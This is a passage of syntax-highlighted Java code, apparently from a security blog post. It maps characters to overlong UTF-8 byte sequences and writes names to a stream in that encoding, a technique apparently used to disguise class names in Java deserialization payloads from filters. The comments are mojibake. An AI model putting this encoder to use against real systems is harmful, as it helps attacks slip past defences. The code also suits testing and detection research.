class="hljs-type">int</span>[]&gt; bytesMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br><br><br>        bytesMap.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xbb</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x81</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x82</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x83</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x84</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x85</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x86</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x87</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x88</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x89</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8c</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8e</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8f</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x90</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x91</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x92</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x93</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x94</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x95</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x97</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x98</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x99</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaa</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xab</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xac</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xad</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaf</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb0</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xba</span>&#125;);<br><br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWritTwoBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = map.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">2</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWriteThreeBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span 